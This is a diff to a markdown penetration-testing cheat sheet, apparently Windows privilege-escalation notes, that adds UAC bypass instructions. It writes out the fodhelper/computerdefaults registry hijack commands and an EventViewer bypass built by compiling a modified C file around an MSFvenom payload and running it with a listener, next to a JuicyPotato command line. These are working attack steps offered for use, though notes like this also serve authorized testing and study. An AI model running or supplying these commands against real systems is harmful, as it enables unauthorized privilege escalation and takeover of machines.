@@ -908,15 +908,33 @@ JuicyPotato.exe -t * -p {run.exe} -l 8003
 
 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
 
-# UAC BYPASS
+# UAC BYPASS using Fodhelper.exe or Computer Defaults.exe
 where /r C:\windows fodhelper.exe
+where /r C:\windows computerdefaults.exe
 
- New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value {C:\Path\to\Exploit\exploit.exe} -Force
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value {C:\Path\to\Exploit\exploit.exe} -Force
 New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
-
-cmd -> fodhelper
+cmd
 
 powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
+powershell Start-Process C:\windows\system32\computerdefaults.exe -WindowStyle Hidden
+
+
+# UAC BYPASS using EventViewer
+https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
+
+Generate MSFvenom .exe payload
+
+Change binary in evenvwrbypass.c to payload
+strcat(curPath, "\run.exe");
+
+Compile to .exe: 64 ot 32 bit
+x86_64-w64-mingw32-gcc evenvwrbypass.c -o eventvwr-bypassuac-64.exe
+i686-w64-mingw32-gcc evenvwrbypass.c -o eventvwr-bypassuac-32.exe
+
+Run Executable with listener setup in same directory as MSFvenom payload
+eventvwr-bypassuac-64.exe
+eventvwr-bypassuac-32.exe
 ```
 
 #### Credential Access
